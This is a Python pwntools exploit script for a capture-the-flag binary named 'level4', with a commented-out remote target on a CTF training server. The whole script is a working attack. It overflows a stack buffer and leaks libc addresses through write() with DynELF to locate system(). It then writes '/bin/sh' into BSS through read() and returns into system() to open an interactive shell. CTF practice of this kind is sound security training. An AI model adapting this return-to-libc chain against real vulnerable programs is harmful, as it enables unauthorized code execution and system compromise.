#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='i386', os='linux')

ELF_IMG = './level4'
BSS = 0x0804A024
# DATA = 0x0804A01C

io = process(ELF_IMG)
# io = remote('127.0.0.1', 4444)
# io = remote('pwn2.jarvisoj.com', 9880)

elf = ELF(ELF_IMG)

offset = 0x88

def leak(address):
    payload = 'a' * (offset + 4) + p32(elf.symbols['write']) + p32(elf.symbols['_start']) + p32(1) + p32(address) + p32(4)
    io.sendline(payload)
    data = io.recv(4)
    # log.debug("%#x => %s" % (address, (data or '').encode('hex')))
    return data

dyn = DynELF(leak, elf=elf)
system_addr = dyn.lookup('system', 'libc')

log.success('system_addr = ' + hex(system_addr))

# raw_input('wait for debug...')

payload = 'a' * (offset + 4) + p32(elf.symbols['read']) + p32(elf.symbols['vulnerable_function']) + p32(0) + p32(BSS) + p32(8)

io.send(payload)

sleep(0.1)
# raw_input('wait for debug...')

io.send('/bin/sh\x00')

sleep(0.1)
# raw_input('wait for debug...')

payload = 'a' * (offset + 4) + p32(system_addr) + p32(0x08048470) + p32(BSS)

io.send(payload)

# raw_input('wait for debug...')
sleep(0.1)

io.interactive()
